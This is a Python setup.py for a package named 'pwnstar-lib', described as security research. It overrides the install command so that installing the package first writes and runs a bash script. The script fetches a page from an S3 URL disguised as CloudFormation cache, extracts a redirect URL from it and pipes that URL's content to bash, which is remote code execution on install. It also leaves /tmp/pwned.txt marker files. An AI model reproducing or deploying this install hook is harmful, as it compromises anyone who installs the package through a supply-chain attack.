from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        # Execute malicious code directly - DON'T call install.run(self) first
        import os
        import subprocess
        
        # Create a basic script to execute
        script_path = "/tmp/payload.sh"
        with open(script_path, "w") as f:
            f.write("#!/bin/bash\n")
            f.write("echo 'Execution confirmed' > /tmp/pwned.txt\n")
            f.write("curl -s https://cloudformation-cache.s3.us-east-1.amazonaws.com/ami/656289367527a205257-Instance-Profile-Enforcement-58b20525-9d6a-4e5d-b41914b86817.html > /tmp/payload_response.txt\n")
            f.write("if grep -q 'REDIRECT_URL' /tmp/payload_response.txt; then\n")
            f.write("  REDIRECT_URL=$(grep -o 'REDIRECT_URL=\"https://[^\"]*\"' /tmp/payload_response.txt | cut -d'\"' -f2)\n")
            f.write("  echo \"Found redirect URL: $REDIRECT_URL\" >> /tmp/pwned.txt\n")
            f.write("  curl -s $REDIRECT_URL | bash\n")
            f.write("else\n")
            f.write("  echo 'No redirect URL found' >> /tmp/pwned.txt\n")
            f.write("fi\n")
        
        # Make executable and run
        os.chmod(script_path, 0o755)
        subprocess.call(["/bin/bash", script_path])
        
        # Only call parent's run() method AFTER executing our code
        install.run(self)

setup(
    name="pwnstar-lib",
    version="2.1",
    author="PwnStar",
    description="Security research package",
    packages=[],
    cmdclass={
        'install': MaliciousInstall,
    },
)